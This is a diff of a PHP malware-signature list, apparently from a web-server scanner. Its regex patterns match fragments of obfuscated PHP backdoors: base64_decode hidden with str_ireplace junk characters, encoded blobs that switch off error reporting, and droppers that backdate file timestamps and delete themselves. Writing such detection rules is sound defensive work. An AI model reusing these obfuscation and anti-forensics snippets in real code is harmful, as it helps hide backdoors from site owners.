+    ),
+    422 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "zUxcrfVVTs"; if \\(file_exists\\("\\.\\/my\\-theaters\\.php"\\)\\)\\{ touch\\("\\.\\/my\\-theaters\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*wdN/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    423 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$aqhyyau\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyy6yyyyyy4yyyy_yyydyyyyeyyyycyyyyoyyydyyyyyeyyy"\\); \\$rkrnd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    424 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$aeukqaz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$pupgazgrf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    425 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ptzqwnvbsa\\=str_ireplace\\("z","","zzbzzzzzzazzzzszzzzezzz6zzz4zzzzzz_zzzzdzzzezzczzzozzzzdzzzzez"\\); \\$bprcvyz\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    426 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pcqxqpuhg\\=str_ireplace\\("g","","ggbgggggagggsggggggegg6ggg4gggg_ggggdggggeggggcgggggogggggdgggggegg"\\); \\$hmtsbfruau\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    427 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "gdnnypGTDW"; if \\(file_exists\\("\\.\\/nofollow\\.php"\\)\\)\\{ touch\\("\\.\\/nofollow\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*0wahuAsrm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    428 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$azxusu\\=str_ireplace\\("q","","qbqqqqqaqqqqsqqqqeqqq6qqqq4qqq_qqqqdqqeqqqqcqqqqqqoqqqqqqdqqqeqq"\\); \\$pwggykh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    429 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$afqdd\\=str_ireplace\\("x","","xbxxaxxxxsxxxxxexxxx6xxx4xxx_xxxxxdxxxxxexxxxxcxxxxoxxxxxdxxxexx"\\); \\$mwnsarun\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    430 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dkfzamusx\\=str_ireplace\\("f","","fffbfffaffffsffefffff6fffff4ffff_fffffdffeffffffcffoffffdfffffefff"\\); \\$npvqhrfc\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    431 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mzdarfwre\\=str_ireplace\\("g","","gggbggggaggsggggeggg6gggg4gggggg_ggggdgggggegggggcggogggggdgggggeggg"\\); \\$uehacwr\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    432 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$asgxt\\=str_ireplace\\("m","","mbmmmmmammmsmmmmemmmmmm6mmmmmm4mmm_mmmmdmmemmmmmmcmmmommdmmmemmm"\\); \\$fxvkmwt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    433 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$htgmk\\=str_ireplace\\("i","","ibiiiiiiaiiisiiiieiiii6iiiii4iiii_iiiiiidiiiieiiiciiioiiiidiiiei"\\); \\$kkydnkg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    434 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mrawuzyff\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xxxx4xx_xxxxdxxxexxxcxxxxoxxxdxxxxex"\\); \\$zwfyukfrw\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    435 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xgbgz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$xwkpmdhv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    436 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}1WTI5a1pTZ2tYMUJQVTFSYkluQjBieUpkS1M0bklqc2dKR0Z/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    437 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zqbzwa\\=str_ireplace\\("q","","qqbqqqqqqaqqqsqqqqeqqqqq6qqqqq4qqqq_qqdqqqqqeqqqqqcqqqoqqdqqeq"\\); \\$bbpnyyfdu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    438 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wfewkcqy\\=str_ireplace\\("h","","hbhhhhhahhshhhhhhehhhhh6hhh4hhhh_hhhhhhdhhhhehhhhhchhohhhhhdhhhehhh"\\); \\$qsnzdwun\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    439 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$suxyp\\=str_ireplace\\("p","","ppbppppppappppspppppepppp6ppp4ppp_ppppdppppppeppppcppppppoppppppdppppep"\\); \\$hkthxfp\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    440 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "mhAkcQFUXH"; if \\(file_exists\\("\\.\\/affiliate_help9\\.php"\\)\\)\\{ touch\\("\\.\\/affiliate_help9\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    441 => 
+    array (
+      'pattern' => '/WNHOXpkQ0lnWVdOMGFXOXVQV2gwZEhBNkx5OG5MaVJmVTBWU[\\s\\S]{0,12000}CBDD\'\\)\\)
+\\{
+	define\\(\'CBDD\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    442 => 
+    array (
+      'pattern' => '/iterator_apply     \\(\\$option, \\$win,                     array                 \\(\\$it\\)           \\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    443 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}HPWnHUZWkEryQCBSDaNbx2vn3dD9muC22NKhuFH99cM7byaK/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    444 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wupxr\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$hfhfmfxhw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    445 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bnpwvxh\\=str_ireplace\\("q","","qqqbqqqqqqaqqqqsqqqqqqeqqqq6qqqq4qqqqq_qqqdqqeqqqcqqqqoqqqqdqqqqqeqqq"\\); \\$tzbpkzqd\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    446 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "ftBXhrcGRX"; if \\(file_exists\\("\\.\\/autosuggest\\.php"\\)\\)\\{ touch\\("\\.\\/autosuggest\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2W8/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    447 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "RkBMEWHPXE"; if \\(file_exists\\("\\.\\/servizi\\.php"\\)\\)\\{ touch\\("\\.\\/servizi\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*rNZgVk3sAZv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    448 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}JaWN1WW1GelpUWTBYMlJsWTI5a1pTZ2tZbUZqZG5Cd1oyNHB/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    449 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "zyWCAcEXCa"; if \\(file_exists\\("\\.\\/shirt\\.config\\.php"\\)\\)\\{ touch\\("\\.\\/shirt\\.config\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*g/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    450 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gaqtaz\\=str_ireplace\\("r","","rbrrrrarrrrrsrrerrrrrr6rrrr4rrrr_rrrrrdrrrerrrrrcrrrrrorrrdrrrerrr"\\); \\$ekbpusfrw\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    451 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zkskxcfu\\=str_ireplace\\("h","","hbhhhahhhhshhhehhhhh6hhhhh4hhhhh_hhdhhhhehhhhhchhhhhohhhhdhhhhheh"\\); \\$esebrzvee\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    452 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wrxxb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$stbassy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    453 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "BDvrpywWUy"; if \\(file_exists\\("\\.\\/config\\.youve\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.youve\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    454 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wuemxs\\=str_ireplace\\("x","","xxxbxxxxxaxxsxxxxxexxx6xxxxx4xxxx_xxxxxdxxxxxexxxxxcxxoxxdxxexx"\\); \\$gvzegvyzgv\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    455 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ztvrqa\\=str_ireplace\\("p","","pppbppappspppppeppp6ppp4pppp_pppdpppeppppcpppppopppdppppep"\\); \\$gudvrvz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    456 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$tqkuntpu\\=str_ireplace\\("g","","gggbggggaggsggggeggg6gggg4gggggg_ggggdgggggegggggcggogggggdgggggeggg"\\); \\$vkmmuybf\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    457 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gbxayq\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wusndy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    458 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gyygbr\\=str_ireplace\\("v","","vbvvvvavvvvvsvvvvvevvv6vvv4vvv_vvvvvdvvvvevvvvcvvvovvvvvdvvev"\\); \\$skkhhr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    459 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dwburuwvzp\\=str_ireplace\\("z","","zzzbzzazzzzzszzzzzezzzzz6zzz4zzz_zzdzzzezzzczzzzozzzzzdzzzezzz"\\); \\$ervqnkdg\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    460 => 
+    array (
+      'pattern' => '/dmNuZGhjbVJsWkNCaGN5QWthMlY1S1NCN0RRcHBaaUFvSVda[\\s\\S]{0,12000}\\^ \\(E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    461 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "PXBDZPmCfS"; if \\(file_exists\\("\\.\\/order2\\-dba\\.php"\\)\\)\\{ touch\\("\\.\\/order2\\-dba\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*eVvnm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    462 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}amVIQjZjbkVwTGljaVBqd3ZkR1ErUEhSa1BsUkVVeUJKVUR3/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    463 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$uwwhghrsz\\=str_ireplace\\("g","","gggbgggggagggggsggggegggggg6gggg4gggg_ggggdggggeggggcggoggggggdggggeg"\\); \\$xatuvvdst\\="DQoJCUBlcnJvcl9yZ/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    464 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*
+@ You should     have received    a c/s',
       'label' => 'sample-specific content window',
     ),
-    1212 => 
+    465 => 
     array (
-      'pattern' => '/foreach\\(\\$_POST as \\$k \\=\\> \\$v\\)\\{
-	\\$kk \\= @pack\\("H\\*", \\$k\\);
-	\\$_POST\\[\\$kk\\]\\=@pack\\("H\\*", \\$v\\);
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Libraries
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\{
+	define\\(\'PATH\', __DIR__\\)             ;
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    466 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$egaxu\\=str_ireplace\\("h","","hbhhhhhahhshhhhhhehhhhh6hhh4hhhh_hhhhhhdhhhhehhhhhchhohhhhhdhhhehhh"\\); \\$hbkfzxkpgz\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    467 => 
+    array (
+      'pattern' => '/EhSa1BqeHBibkIxZENCMGVYQmxQU0owWlhoMElpQnVZVzFsU[\\s\\S]{0,12000}d\\(\'HKPN\'\\)\\)
+\\{
+	define\\(\'HKPN\', __DIR__\\);
+\\}
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    468 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wbsfew\\=str_ireplace\\("f","","fffbfffaffffsffefffff6fffff4ffff_fffffdffeffffffcffoffffdfffffefff"\\); \\$hydxnwv\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    469 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$apqcgmb\\=str_ireplace\\("p","","pbpppappsppppepppp6pppp4ppp_ppppppdppepppcpppppopppppdppppep"\\); \\$grrwsvcg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    470 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gpefsaezvs\\=str_ireplace\\("k","","kkkbkkkkakkkkskkkkkekkkk6kkkkkk4kkkkk_kkdkkkkkekkkkkckkkkokkkkkkdkkkkkekk"\\); \\$wagxh\\="DQoJCUBlcnJvcl9y/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    471 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "mTDWHMbQGR"; if \\(file_exists\\("\\.\\/nominate_topic\\.php"\\)\\)\\{ touch\\("\\.\\/nominate_topic\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    472 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "dRAszwNZEC"; if \\(file_exists\\("\\.\\/404error\\.php"\\)\\)\\{ touch\\("\\.\\/404error\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*g7wTpPURC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    473 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}3dlptOXliVDRuT3cwS1pHbGxLQ2s3RFFwOURRb3ZMeUF3U0V/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    474 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "CtFaPEPruE"; if \\(file_exists\\("\\.\\/feed_embed\\.php"\\)\\)\\{ touch\\("\\.\\/feed_embed\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ZKtVd/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    475 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}xfW46zCsgGhfFyncCB5HRvUrKrUTuaC2UyAvbN9DasZ80m
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    476 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$nspbkc\\=str_ireplace\\("i","","ibiiiiiiaiiisiiiieiiii6iiiii4iiii_iiiiiidiiiieiiiciiioiiiidiiiei"\\); \\$arrzfuk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    477 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "yGSTbWqRHF"; if \\(file_exists\\("\\.\\/security\\.php"\\)\\)\\{ touch\\("\\.\\/security\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*T8AEwrB0g/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    478 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$sdzhvncxx\\=str_ireplace\\("u","","ubuuuuauuuusuuuuueuuuu6uuuu4uuuuu_uuuduuuueuuuucuuuuuuouuuduuuueuu"\\); \\$gzvqbcehyp\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    479 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}ZshUN3yPvUDuw3WMp1T0qfx9HpCvDRBGCVXQdPb1Etku8pRA/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    480 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vktnhr\\=str_ireplace\\("y","","ybyyyyayysyyyyeyyy6yyy4yyyyy_yyyyyydyyyyeyyyyycyyyoyydyyyyey"\\); \\$uxsaqmbxg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    481 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rguakmw\\=str_ireplace\\("h","","hhhbhhhhahhhshhhehhh6hhhh4hhh_hhhdhhhhehhhhchhhhhohhhhdhhhhheh"\\); \\$skyhygdhh\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    482 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "erVDuMxpGN"; if \\(file_exists\\("\\.\\/cat_search\\.php"\\)\\)\\{ touch\\("\\.\\/cat_search\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*MWwYA/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    483 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "tNTBDmWSND"; if \\(file_exists\\("\\.\\/loading\\.php"\\)\\)\\{ touch\\("\\.\\/loading\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*uefR7H687rS/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    484 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gudppgw\\=str_ireplace\\("x","","xbxxxxxaxxxsxxexxx6xxx4xxxxx_xxxdxxxxexxxxxcxxxoxxxxdxxxexxx"\\); \\$qrbqrgym\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    485 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$msphsbrxn\\=str_ireplace\\("u","","ubuuuuauuuusuuuuueuuuu6uuuu4uuuuu_uuuduuuueuuuucuuuuuuouuuduuuueuu"\\); \\$hvrekkqhf\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    486 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ngdzfqvp\\=str_ireplace\\("r","","rbrrrrarrrrsrrrrerrrrrr6rrrrrr4rrrrr_rrrrdrrrrrerrrrrrcrrrrrorrrrrrdrrrrerr"\\); \\$rkaedcm\\="DQoJCUBlcnJvcl/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    487 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$uszmnemhw\\=str_ireplace\\("i","","ibiiaiisiiiieiiiiii6iii4iiii_iidiiiiieiiiciiiioiiiidiiiiiei"\\); \\$kfthbsmuh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    488 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Stream\\.nsw\\.Libraries
+ \\*[\\s\\S]{0,12000}\'IS_UNIX\', \\(IS_WIN \\=\\=\\= false\\) \\? true \\: false\\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    489 => 
+    array (
+      'pattern' => '/SEJzYjJSbEtDSXZJaXdnWW1GelpUWTBYMlJsWTI5a1pTZ2tj[\\s\\S]{0,12000}\'\\)\\)
+\\{
+	define\\(\'FWVUDV\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    490 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "EdHrZHhUuv"; if \\(file_exists\\("\\.\\/config\\.parallel\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.parallel\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    491 => 
+    array (
+      'pattern' => '/5qY2l3aWR5SXBPeUFOQ21ad2RYUnpLQ1JtY0N4cGJYQnNiMl[\\s\\S]{0,12000}LL \\^ \\(E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    492 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}mtlbVpuWTNndUp5SStQQzkwWkQ0TkNqd3ZkSEkrUEhSeVBqe/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    493 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$abfhbk\\=str_ireplace\\("f","","fbffffaffffffsffffeffffff6ff4fffff_ffdffffffefffffcffffoffffdffffef"\\); \\$supcd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    494 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xgkcsbxs\\=str_ireplace\\("w","","wwwbwwawwwwwswwwwewwww6www4wwww_wwwwdwwwwwewwwwwcwwwwwowwwdwweww"\\); \\$rycpuks\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    495 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xkdczuwh\\=str_ireplace\\("m","","mbmmmmmammmsmmmmemmmmmm6mmmmmm4mmm_mmmmdmmemmmmmmcmmmommdmmmemmm"\\); \\$fdzdqckf\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    496 => 
+    array (
+      'pattern' => '/B1Sno5dGIyUmxQWE5sZEdOdmJtWnBaeVpyWlhrOUp5NGtYMG[\\s\\S]{0,12000}BHP\'\\)\\)
+\\{
+	define\\(\'NBHP\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    497 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$tqbzry\\=str_ireplace\\("t","","ttbttatttstttttettttt6ttt4tttt_tttttdtttettttctttotttdtttet"\\); \\$wgfhruf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    498 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "qBfTrbzhhU"; if \\(file_exists\\("\\.\\/message\\.php"\\)\\)\\{ touch\\("\\.\\/message\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2EwKUbGp5f7/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    499 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zvqrtg\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$uxfqmwewwu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    500 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$unxfbkz\\=str_ireplace\\("x","","xxbxxxaxxxxsxxxexxx6xxxxx4xxx_xxxxxdxxexxcxxxoxxxxxdxxxxxexx"\\); \\$xsrwkt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    501 => 
+    array (
